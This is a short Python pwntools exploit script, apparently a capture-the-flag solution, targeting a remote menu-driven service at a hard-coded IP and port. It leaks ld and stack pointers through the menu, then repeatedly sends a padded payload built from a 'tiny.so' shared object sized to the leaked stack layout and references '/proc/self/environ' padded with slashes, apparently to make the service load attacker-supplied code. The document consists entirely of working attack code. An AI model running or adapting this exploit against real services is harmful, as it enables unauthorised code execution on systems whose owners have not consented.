from pwn import *

FN = 'b6cb83fbeb243e64.so'

context.update(arch='amd64', os='linux')

s = remote('110.10.147.113', 6677); IP = '123.123.123.123'

def menu(v):
    s.recvuntil('> ')
    s.sendline(str(v))

def leakptr():
    menu(3)
    for i in range(4):
        s.recvline()
    s.sendline('1')
    s.sendline('1')
    s.sendline('x')
    lo = int(s.recvline().split(' : ')[0])
    s.sendline('1')
    s.sendline('x')
    hi = int(s.recvline().split(' : ')[0])
    s.sendline('1')
    s.sendline('1')
    s.sendline('1')

    return (hi << 32) | lo

ld_leak = leakptr()
log.info("Leaked ld pointer %#x", ld_leak)
menu(5)
s.sendline('k')
stack_leak = leakptr()
log.info("Leaked stack pointer %#x", stack_leak)

def gen_payload(sz):
    pad = sz - 0xd40 - len(IP)
    payload = open('tiny.so', 'rb').read()
    pad2 = sz - pad - len(payload)
    log.info("pad 1: %d, pad 2: %d", pad, pad2)
    return 'A' * pad + payload + 'B' * pad2

pause()

stack_top = (stack_leak + 4096) & ~0xfff
for pages in range(1, 5):
    log.info("Attacking with %d extra stack pages...", pages)
    menu(1)
    s.sendline(gen_payload(stack_top - stack_leak - 0x80 + pages * 4096))
    menu(1)
    s.sendline(FN)
    menu(2)
    s.sendline('/proc/self/environ'.rjust(32, '/'))
